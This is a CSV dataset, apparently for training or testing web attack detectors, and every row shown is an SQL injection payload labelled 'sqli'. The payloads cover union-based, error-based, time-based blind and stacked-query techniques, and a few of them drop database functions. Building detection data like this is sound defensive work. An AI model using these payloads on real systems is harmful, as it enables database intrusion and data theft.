content,attack_type,source,source_uid,orig_attack_type_label
"1%"")) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""%""=""",1,external_httpparamsdataset,external_httpparamsdataset_13277,sqli
1 order by 1--,1,external_httpparamsdataset,external_httpparamsdataset_13278,sqli
"1%"")));select benchmark(5000000,md5(0x714e4153))#",1,external_httpparamsdataset,external_httpparamsdataset_13279,sqli
"1) as wbcd where 9506=9506 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",1,external_httpparamsdataset,external_httpparamsdataset_13280,sqli
"1',(select (case when (7616=7616) then 1 else 1/(select 0) end))",1,external_httpparamsdataset,external_httpparamsdataset_13281,sqli
"1"" where 1203=1203 union all select null,null,null--",1,external_httpparamsdataset,external_httpparamsdataset_13282,sqli
"1"" and make_set(8403=8403,8899)",1,external_httpparamsdataset,external_httpparamsdataset_13283,sqli
"1"" and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""krtr"" like ""krtr",1,external_httpparamsdataset,external_httpparamsdataset_13284,sqli
"-5771')) union all select 2833,2833,2833,2833,2833,2833--",1,external_httpparamsdataset,external_httpparamsdataset_13285,sqli
1%')));select (case when (6859=6507) then 6859 else 6859*(select 6859 from mysql.db) end)#,1,external_httpparamsdataset,external_httpparamsdataset_13286,sqli
"1) as keog where 8033=8033 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",1,external_httpparamsdataset,external_httpparamsdataset_13287,sqli
"1%"") union all select null,null#",1,external_httpparamsdataset,external_httpparamsdataset_13288,sqli
"1'||(select 'hwdj' where 8179=8179;iif(3447=1084,1,1/0)",1,external_httpparamsdataset,external_httpparamsdataset_13289,sqli
"-6599%"")) or make_set(9354=9354,7185) and ((""%""=""",1,external_httpparamsdataset,external_httpparamsdataset_13290,sqli
"1) as ocut where 6800=6800 and elt(4249=4249,7259)--",1,external_httpparamsdataset,external_httpparamsdataset_13291,sqli
1'+(select 'njee' where 4101=4101 and 3090=7873)+',1,external_httpparamsdataset,external_httpparamsdataset_13292,sqli
-8015) where 9808=9808 or 9323=9323#,1,external_httpparamsdataset,external_httpparamsdataset_13293,sqli
"-4329') union all select 1353,1353,1353,1353,1353,1353#",1,external_httpparamsdataset,external_httpparamsdataset_13294,sqli
"1"")));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (((""xxug""=""xxug",1,external_httpparamsdataset,external_httpparamsdataset_13295,sqli
"1%') union all select null,null,null--",1,external_httpparamsdataset,external_httpparamsdataset_13296,sqli
"1') union all select null,null,null,null,null,null,null,null--",1,external_httpparamsdataset,external_httpparamsdataset_13297,sqli
"1')) and make_set(8403=8403,8899) and (('sxgl'='sxgl",1,external_httpparamsdataset,external_httpparamsdataset_13298,sqli
"1'))) union all select null,null,null,null,null#",1,external_httpparamsdataset,external_httpparamsdataset_13299,sqli
"-2325) union all select 4692,4692,4692,4692#",1,external_httpparamsdataset,external_httpparamsdataset_13300,sqli
"1) as jdhz where 2021=2021;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1,external_httpparamsdataset,external_httpparamsdataset_13301,sqli
"1')))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((('nets' like 'nets",1,external_httpparamsdataset,external_httpparamsdataset_13302,sqli
1)) as ogcv where 4396=4396;if(7899=7899) select 7899 else drop function zbbp--,1,external_httpparamsdataset,external_httpparamsdataset_13303,sqli
"1"")) as hdyn where 6027=6027 union all select null,null,null--",1,external_httpparamsdataset,external_httpparamsdataset_13304,sqli
1'||(select 'vvpn' from dual where 7011=7011 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))||',1,external_httpparamsdataset,external_httpparamsdataset_13305,sqli
-4191) order by 1#,1,external_httpparamsdataset,external_httpparamsdataset_13306,sqli
"1'+(select 'yhcf' where 8367=8367;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1,external_httpparamsdataset,external_httpparamsdataset_13307,sqli
"1'))) and elt(4249=4249,7259) and ((('kbkz'='kbkz",1,external_httpparamsdataset,external_httpparamsdataset_13308,sqli
"1') and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)",1,external_httpparamsdataset,external_httpparamsdataset_13309,sqli
"1"") as oijn where 1521=1521 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,external_httpparamsdataset,external_httpparamsdataset_13310,sqli
1) or 4240=(select 4240 from pg_sleep(5))--,1,external_httpparamsdataset,external_httpparamsdataset_13311,sqli
1 waitfor delay '0:0:5'# opyp,1,external_httpparamsdataset,external_httpparamsdataset_13312,sqli
"1"")));select (case when (8993=8846) then 8993 else 8993*(select 8993 from mysql.db) end)#",1,external_httpparamsdataset,external_httpparamsdataset_13313,sqli
"1') as mpsf where 3348=3348;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1,external_httpparamsdataset,external_httpparamsdataset_13314,sqli
"1) as wxms where 7272=7272 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,external_httpparamsdataset,external_httpparamsdataset_13315,sqli
"1' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'mnod'='mnod",1,external_httpparamsdataset,external_httpparamsdataset_13316,sqli
1') as zmvn where 2887=2887 union all select null--,1,external_httpparamsdataset,external_httpparamsdataset_13317,sqli
"1') and 3824=benchmark(5000000,md5(0x76555642)) and ('urxs'='urxs",1,external_httpparamsdataset,external_httpparamsdataset_13318,sqli
"1%"")) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,external_httpparamsdataset,external_httpparamsdataset_13319,sqli
"1"") as zjwu where 9963=9963 or 8514=benchmark(5000000,md5(0x544d5a4c))#",1,external_httpparamsdataset,external_httpparamsdataset_13320,sqli
"1'+(select 'rryx' where 1228=1228 union all select null,null,null,null,null,null,null,null,null#",1,external_httpparamsdataset,external_httpparamsdataset_13321,sqli
"1')) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1,external_httpparamsdataset,external_httpparamsdataset_13322,sqli
"1%"")) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""%""=""",1,external_httpparamsdataset,external_httpparamsdataset_13323,sqli
1 where 7055=7055;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,1,external_httpparamsdataset,external_httpparamsdataset_13324,sqli
"-2916"")) or 4946=8232--",1,external_httpparamsdataset,external_httpparamsdataset_13325,sqli
"-3955%')) union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#",1,external_httpparamsdataset,external_httpparamsdataset_13326,sqli
1) where 2170=2170;select sleep(5)--,1,external_httpparamsdataset,external_httpparamsdataset_13327,sqli
"-2667) union all select 5848,5848,5848,5848--",1,external_httpparamsdataset,external_httpparamsdataset_13328,sqli
"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--",1,external_httpparamsdataset,external_httpparamsdataset_13329,sqli
"1') union all select null,null,null--",1,external_httpparamsdataset,external_httpparamsdataset_13330,sqli
"1' where 5702=5702 and elt(3114=3114,sleep(5))#",1,external_httpparamsdataset,external_httpparamsdataset_13331,sqli
"1""))) union all select null--",1,external_httpparamsdataset,external_httpparamsdataset_13332,sqli
"1';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'tmdj' like 'tmdj",1,external_httpparamsdataset,external_httpparamsdataset_13333,sqli
"-4076')) union all select 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--",1,external_httpparamsdataset,external_httpparamsdataset_13334,sqli
"1')));select benchmark(5000000,md5(0x4c4d6142)) and ((('lqwz'='lqwz",1,external_httpparamsdataset,external_httpparamsdataset_13335,sqli
1%')));select pg_sleep(5) and ((('%'=',1,external_httpparamsdataset,external_httpparamsdataset_13336,sqli
"1%"") or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,external_httpparamsdataset,external_httpparamsdataset_13337,sqli
-2817%') or 8255=3841--,1,external_httpparamsdataset,external_httpparamsdataset_13338,sqli
1'||(select 'sbip' from dual where 7302=7302 and (select * from (select(sleep(5)))fzno))||',1,external_httpparamsdataset,external_httpparamsdataset_13339,sqli
"1%') and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,external_httpparamsdataset,external_httpparamsdataset_13340,sqli
"1))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((6395=6395",1,external_httpparamsdataset,external_httpparamsdataset_13341,sqli
"1) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (3326=3326",1,external_httpparamsdataset,external_httpparamsdataset_13342,sqli
"1') where 7279=7279 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,external_httpparamsdataset,external_httpparamsdataset_13343,sqli
"1"");select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""unju""=""unju",1,external_httpparamsdataset,external_httpparamsdataset_13344,sqli
"1%"";select benchmark(5000000,md5(0x714e4153))#",1,external_httpparamsdataset,external_httpparamsdataset_13345,sqli
"1""));select case when 7717=7717 then 1 else null end--",1,external_httpparamsdataset,external_httpparamsdataset_13346,sqli
"1')) as hfra where 6500=6500 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,external_httpparamsdataset,external_httpparamsdataset_13347,sqli
1%') rlike (select * from (select(sleep(5)))vwyq)#,1,external_httpparamsdataset,external_httpparamsdataset_13348,sqli
"1')) as ewsw where 4667=4667 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1,external_httpparamsdataset,external_httpparamsdataset_13349,sqli
"1) as boed where 6787=6787;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1,external_httpparamsdataset,external_httpparamsdataset_13350,sqli
1'+(select brgo where 9100=9100 or 4240=(select 4240 from pg_sleep(5))--,1,external_httpparamsdataset,external_httpparamsdataset_13351,sqli
"1%'))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,external_httpparamsdataset,external_httpparamsdataset_13352,sqli
1')) waitfor delay '0:0:5'--,1,external_httpparamsdataset,external_httpparamsdataset_13353,sqli
1' where 9708=9708 or sleep(5)--,1,external_httpparamsdataset,external_httpparamsdataset_13354,sqli
"1"" where 3510=3510;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,external_httpparamsdataset,external_httpparamsdataset_13355,sqli
1';select sleep(5) and 'yzix'='yzix,1,external_httpparamsdataset,external_httpparamsdataset_13356,sqli
"1'+(select niht where 7294=7294 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,external_httpparamsdataset,external_httpparamsdataset_13357,sqli
"1'||(select 'tdcr' where 6792=6792 union all select null,null,null,null,null#",1,external_httpparamsdataset,external_httpparamsdataset_13358,sqli
1') as ulbr where 7233=7233 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,1,external_httpparamsdataset,external_httpparamsdataset_13359,sqli
"-3852') union all select 3577,3577,3577,3577,3577,3577,3577,3577#",1,external_httpparamsdataset,external_httpparamsdataset_13360,sqli
-8224') where 6504=6504 or 2461=5660,1,external_httpparamsdataset,external_httpparamsdataset_13361,sqli
"1%"";select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ""%""=""",1,external_httpparamsdataset,external_httpparamsdataset_13362,sqli
"-3955 where 7276=7276 union all select 7276,7276,7276,7276,7276,7276,7276,7276,7276--",1,external_httpparamsdataset,external_httpparamsdataset_13363,sqli
"1"" or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",1,external_httpparamsdataset,external_httpparamsdataset_13364,sqli
"1"") where 3404=3404 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,external_httpparamsdataset,external_httpparamsdataset_13365,sqli
1' in boolean mode);if(3392=4422) select 3392 else drop function xsqq--,1,external_httpparamsdataset,external_httpparamsdataset_13366,sqli
"1) where 5465=5465 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,external_httpparamsdataset,external_httpparamsdataset_13367,sqli
"1' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and 'kudh' like 'kudh",1,external_httpparamsdataset,external_httpparamsdataset_13368,sqli
"-6084"")) union all select 7354,7354,7354,7354,7354,7354,7354,7354#",1,external_httpparamsdataset,external_httpparamsdataset_13369,sqli
"-2230%"" union all select 3303,3303,3303--",1,external_httpparamsdataset,external_httpparamsdataset_13370,sqli
1) where 5629=5629;select (case when (8375=8318) then 8375 else cast(1 as int)/(select 0 from dual) end) from dual--,1,external_httpparamsdataset,external_httpparamsdataset_13371,sqli
"-7795"") where 1712=1712 union all select 1712,1712,1712,1712#",1,external_httpparamsdataset,external_httpparamsdataset_13372,sqli
"-4127%' union all select 9558,9558,9558#",1,external_httpparamsdataset,external_httpparamsdataset_13373,sqli
"1' in boolean mode) union all select null,null,null,null,null,null--",1,external_httpparamsdataset,external_httpparamsdataset_13374,sqli
"-3017"")) as ljit where 9128=9128 union all select 9128,9128,9128,9128,9128--",1,external_httpparamsdataset,external_httpparamsdataset_13375,sqli
"1') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",1,external_httpparamsdataset,external_httpparamsdataset_13376,sqli
"1' and elt(1210=1210,sleep(5)) and 'pjrf'='pjrf",1,external_httpparamsdataset,external_httpparamsdataset_13377,sqli
"1 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))# qmkh",1,external_httpparamsdataset,external_httpparamsdataset_13378,sqli
"1;select * from generate_series(3341,3341,case when (3341=3072) then 1 else 0 end) limit 1--",1,external_httpparamsdataset,external_httpparamsdataset_13379,sqli
1')));(select * from (select(sleep(5)))acdk)#,1,external_httpparamsdataset,external_httpparamsdataset_13380,sqli
"-6965') union all select 2857,2857,2857,2857,2857,2857,2857,2857,2857,2857--",1,external_httpparamsdataset,external_httpparamsdataset_13381,sqli
"1' in boolean mode) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,external_httpparamsdataset,external_httpparamsdataset_13382,sqli
